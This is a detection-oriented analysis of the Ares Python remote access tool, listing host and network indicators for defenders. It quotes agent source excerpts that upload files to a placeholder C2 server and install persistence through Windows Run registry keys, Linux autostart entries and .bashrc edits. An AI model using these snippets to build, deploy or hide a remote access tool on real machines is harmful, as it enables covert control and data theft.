# Ares

## Table of Contents

- [Ares](#ares)
  - [Table of Contents](#table-of-contents)
  - [Metadata](#metadata)
  - [Description](#description)
  - [Documentation](#documentation)
  - [Indicators](#indicators)
  - [Capabilities](#capabilities)
    - [Download Files](#download-files)
    - [Upload Files](#upload-files)
    - [Zip Files](#zip-files)
    - [Screenshot](#screenshot)
    - [Execute Python Code](#execute-python-code)
    - [CMD](#cmd)
    - [Persiste](#persiste)
    - [Clean](#clean)
  - [Functionalities](#functionalities)
    - [serverHello](#serverhello)
    - [send_output](#send_output)
    - [update_consecutive_failed_connections](#update_consecutive_failed_connections)

## Metadata

- Evaluator(s): [Nasreddine Bencherchali (@nas_bench)](https://twitter.com/nas_bench)
- Date: 22/01/2022
- Modified: 22/01/2022
- Source: [Ares](https://github.com/sweetsoftware/Ares)
- Implementation: Python

## Description

> Ares is a Python Remote Access Tool - [Ares README](https://github.com/sweetsoftware/Ares#ares)

## Documentation

- [Ares - supported agent commands](https://github.com/sweetsoftware/Ares#supported-agent-commands)

## Indicators

| Description        | Indicator                                                                                                          | Reference                          |
|--------------------|--------------------------------------------------------------------------------------------------------------------|------------------------------------|
| HTTP Post Request   | ```http(s)://[SERVER_IP]/api/USERNAME_[UUID]/upload``` | [Upload Files](#upload-files) |
| HTTP Post Request   | ```http(s)://[SERVER_IP]/api/USERNAME_[UUID]/hello``` | [Server Hello](#serverhello) |
| HTTP Post Request   | ```http(s)://[SERVER_IP]/api/USERNAME_[UUID]/report``` | [Send Output](#send_output) |
| User-Agent   | ```python-requests/(Version)``` | [Upload Files](#upload-files)<br />[Server Hello](#serverhello)<br />[Send Output](#send_output) |
| File Creation (Windows)   | ```%temp%\[RandomFileName].png``` | [Screenshot](#screenshot) |
| File Creation (Linux)   | ```/tmp/[RandomFileName].png``` | [Screenshot](#screenshot) |
| File Creation (Windows)   | ```%USERPROFILE%\ares\[AgentName]``` | [Persiste](#persiste) |
| File Creation (Linux)   | ```~\.ares\[AgentName]``` | [Persiste](#persiste) |
| File Creation (Linux)   | ```~/.config/autostart/ares.desktop``` | [Persiste](#persiste) |
| File Creation (Windows)   | ```%USERPROFILE%\ares\failed_connections``` | [Update Consecutive Failed Connections](#update_consecutive_failed_connections) |
| File Creation (Linux)   | ```~/.ares/failed_connections``` | [Update Consecutive Failed Connections](#update_consecutive_failed_connections) |
| Directory Creation (Windows)   | ```%USERPROFILE%\ares``` | [Persiste](#persiste) |
| Directory Creation (Linux)   | ```~\.ares``` | [Persiste](#persiste) |
| Process Creation (Windows)   | ```reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d %USERPROFILE%\ares\[AgentName]``` | [Persiste](#persiste) |
| Process Creation (Windows)   | ```reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares``` | [Persiste](#persiste) |
| Process Creation (Windows)   | ```reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /f /v ares /t REG_SZ /d "cmd.exe /c del /s /q %USERPROFILE%\ares & rmdir %USERPROFILE%\ares"``` | [Persiste](#persiste) |
| Process Creation (Linux)   | ```chmod +x``` | [Persiste](#persiste) |
| Process Creation (Linux)   | ```grep -v .ares .bashrc > .bashrc.tmp``` | [Persiste](#persiste) |
| Process Creation (Linux)   | ```mv .bashrc.tmp .bashrc``` | [Persiste](#persiste) |

## Capabilities

### Download Files

- Description: Downloads a file to the agent host through HTTP(S)
- Source Reference:
  - https://github.com/sweetsoftware/Ares/blob/master/agent/agent.py#L169
- Indicators:
  - TBD

### Upload Files

- Description: Uploads a local file to the server
- Source Reference:
  - https://github.com/sweetsoftware/Ares/blob/master/agent/agent.py#L155
- Indicators:
  - Send `POST` request to the C2 with the following URL: `http(s)://[SERVER_IP]/api/USERNAME_[UUID]/upload`

    ```python
    try:
        if os.path.exists(file) and os.path.isfile(file):
            self.send_output("[*] Uploading %s..." % file)
            requests.post(config.SERVER + '/api/' + self.uid + '/upload',
                files={'uploaded': open(file, 'rb')})
    ```

  - The request is sent with the default `USER-AGENT` of the `requests` package: `python-requests/(Version)`

### Zip Files

- Description: Zips a folder or file
- Source Reference:
  - https://github.com/sweetsoftware/Ares/blob/master/agent/agent.py#L241
- Indicators:
  - TBD

### Screenshot

- Description: Create a screenshot and saves it under the the temp directory of the user (“%temp%” on windows and “/tmp” on linux)
- Source Reference:
  - https://github.com/sweetsoftware/Ares/blob/master/agent/agent.py#L264
- Indicators:
  - WINDOWS:
    - Create a random file in the `%temp%` directory

        ```python
        .....
        tmp_file = tempfile.NamedTemporaryFile()
        screenshot_file = tmp_file.name + ".png"
        .....
        ```

  - LINUX:
    - Create a random file in the `/tmp` directory

        ```python
        .....
        tmp_file = tempfile.NamedTemporaryFile()
        screenshot_file = tmp_file.name + ".png"
        .....
        ```

### Execute Python Code

- Description: Runs a python command or a python file and returns the output
- Source Reference:
  - https://github.com/sweetsoftware/Ares/blob/master/agent/agent.py#L124
- Indicators:
  - TBD

### CMD

- Description: Runs a shell command and returns its output
- Source Reference:
  - https://github.com/sweetsoftware/Ares/blob/master/agent/agent.py#L113
- Indicators:
  - TBD

### Persiste

- Description: Install/Enable persistence on the target agent
- Source Reference:
  - https://github.com/sweetsoftware/Ares/blob/master/agent/agent.py#L185
- Indicators:
  - WINDOWS:
    - On Windows the agent creates the following directory: `%userprofile%\ares`
  
        ```python
        .....
        elif platform.system() == 'Windows':
            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)
        .....
        ```

    - Create the a copy of the running agent in the following directory: `%userprofile%\ares\`

        ```python
        agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
        shutil.copyfile(sys.executable, agent_path)
        ```

    - Execute the `reg` command to persiste via the registry by creating the value `ares`

        ```python
        cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d \"%s\"" % agent_path
        subprocess.Popen(cmd, shell=True)
        ```

  - LINUX:
    - On Linux the agent creates the following directory: `~/.ares`

        ```python
        .....
        if platform.system() == 'Linux':
            persist_dir = self.expand_path('~/.ares')
            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)
        .....
        ```

    - Create a copy of the running agent in the following directory: `~/.ares/`

        ```python
        agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
        shutil.copyfile(sys.executable, agent_path)
        ```

    - Execute `chmod +x` on the newly created file

        ```python
        os.system('chmod +x ' + agent_path)
        ```

    - Create the following file and directory: `~/.config/autostart/ares.desktop`

        ```python
        .....
        if os.path.exists(self.expand_path("~/.config/autostart/")):
            desktop_entry = "[Desktop Entry]\nVersion=1.0\nType=Application\nName=Ares\nExec=%s\n" % agent_path
            with open(self.expand_path('~/.config/autostart/ares.desktop'), 'w') as f:
                f.write(desktop_entry)
        .....
        ```

    - Modified the content of `~/.bashrc`

        ```python
        with open(self.expand_path("~/.bashrc"), "a") as f:
            f.write("\n(if [ $(ps aux|grep " + os.path.basename(sys.executable) + "|wc -l) -lt 2 ]; then " + agent_path + ";fi&)\n")
        ```

### Clean

- Description: Deletes any persistence previously created
- Source Reference:
  - https://github.com/sweetsoftware/Ares/blob/master/agent/agent.py#L217
- Indicators:
  - WINDOWS:
    - Execute the `reg` command to remove its persistence

        ```python
        cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares"
        subprocess.Popen(cmd, shell=True)
        cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v ares /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (persist_dir, persist_dir)
        subprocess.Popen(cmd, shell=True)
        ```

  - LINUX:
    - Deletes the created files and directories

        ```python
        .....
        persist_dir = self.expand_path('~/.ares')
        if os.path.exists(persist_dir):
            shutil.rmtree(persist_dir)
        desktop_entry = self.expand_path('~/.config/autostart/ares.desktop')
        if os.path.exists(desktop_entry):
            os.remove(desktop_entry)
        .....
        ```

    - Execute the following command to restore the `.bashrc`

        ```python
        os.system("grep -v .ares .bashrc > .bashrc.tmp;mv .bashrc.tmp .bashrc")
        ```

## Functionalities

### serverHello

- Description: Ask server for instructions
- Source Reference:
  - https://github.com/sweetsoftware/Ares/blob/master/agent/agent.py#L90
- Indicators:
  - Send `POST` request to the C2 with the following URL: `http(s)://[SERVER_IP]/api/USERNAME_[UUID]/hello`

    ```python
    def server_hello(self):
        """ Ask server for instructions """
        req = requests.post(config.SERVER + '/api/' + self.uid + '/hello',
            json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
        return req.text
    ```

  - The request is sent with the default `USER-AGENT` of the `requests` package: `python-requests/(Version)`

### send_output

- Description: Send data back to the C2
- Source Reference:
  - https://github.com/sweetsoftware/Ares/blob/master/agent/agent.py#L96
- Indicators:
  - Send `POST` request to the C2 with the following URL: `http(s)://[SERVER_IP]/api/USERNAME_[UUID]/report`

    ```python
    def send_output(self, output, newlines=True):
        """ Send console output to server """
        if self.silent:
            self.log(output)
            return
        if not output:
            return
        if newlines:
            output += "\n\n"
        req = requests.post(config.SERVER + '/api/' + self.uid + '/report', 
        data={'output': output})
    ```

  - The request is sent with the default `USER-AGENT` of the `requests` package: `python-requests/(Version)`

### update_consecutive_failed_connections

- Description: Logs the number of "failed" connections or exceptions within the main loop
- Source Reference:
  - https://github.com/sweetsoftware/Ares/blob/master/agent/agent.py#L73
- Indicators:
  - WINDOWS:
    - Create the `failed_connections` inside the `%USERPROFILE%\ares` directory
  - LINUX:
    - Create the `failed_connections` inside the `~/ares` directory
